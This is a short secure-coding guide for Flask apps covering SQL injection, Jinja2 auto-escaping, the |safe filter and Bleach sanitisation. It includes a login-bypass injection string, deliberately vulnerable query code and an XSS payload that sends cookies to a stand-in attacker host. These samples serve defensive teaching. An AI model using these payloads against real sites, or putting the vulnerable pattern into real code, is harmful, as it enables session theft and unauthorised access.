## 1. SQL Injection (SQLi) Defenses

> ⚠️ **The SQLi Hazard**: Concatenating raw user input into SQL query strings allows hackers to manipulate SQL commands (e.g. entering `' OR '1'='1` in a login form to bypass password checks!).

```python
# ❌ VULNERABLE TO SQL INJECTION (Raw string concatenation!)
username_input = request.form['username']
query = f"SELECT * FROM users WHERE username = '{username_input}'"
db.session.execute(query)

# ✅ SECURE (SQLAlchemy ORM Parameterized Query)
# SQLAlchemy automatically uses parameterized query placeholders!
user = User.query.filter_by(username=username_input).first()
```

## 2. Jinja2 Auto-Escaping & The Danger of `|safe`

Jinja2 automatically escapes HTML tags (`<` -> `&lt;`, `>` -> `&gt;`) in variables rendered inside `{{ var }}` tags to prevent XSS script execution.

> ⚠️ **THE `|safe` TRAP**: The Jinja2 `|safe` filter tells Jinja2: *"Do not escape this HTML; render it as raw executable code!"*
> If you apply `|safe` to untrusted user input, hackers can inject `<script>location.href='http://hacker.com/steal?cookie='+document.cookie</script>`!

```html
<!-- ❌ DANGEROUS IF user_comment CONTAINS UNTRUSTED INPUT -->
<p>{{ user_comment | safe }}</p>

<!-- ✅ SAFE DEFAULT (Auto-escapes script tags into harmless plain text) -->
<p>{{ user_comment }}</p>
```

## 3. HTML Input Sanitization with `Bleach`

If your application permits rich-text formatting (e.g., blog comments allowing `<b>`, `<i>`, or `<a>` tags), do **NOT** use `|safe` directly. Sanitize input using **`Bleach`**:

```bash
pip install bleach
```

Sanitize user input before saving to database or rendering:

```python
import bleach

def sanitize_user_html(raw_input):
    """Strips dangerous <script>, <iframe>, and onclick event handlers!"""
    allowed_tags = ['b', 'i', 'u', 'em', 'strong', 'a', 'p']
    allowed_attrs = {'a': ['href', 'title']}
    
    cleaned_html = bleach.clean(
        raw_input,
        tags=allowed_tags,
        attributes=allowed_attrs,
        strip=True  # Completely removes disallowed tags!
    )
    return cleaned_html
```
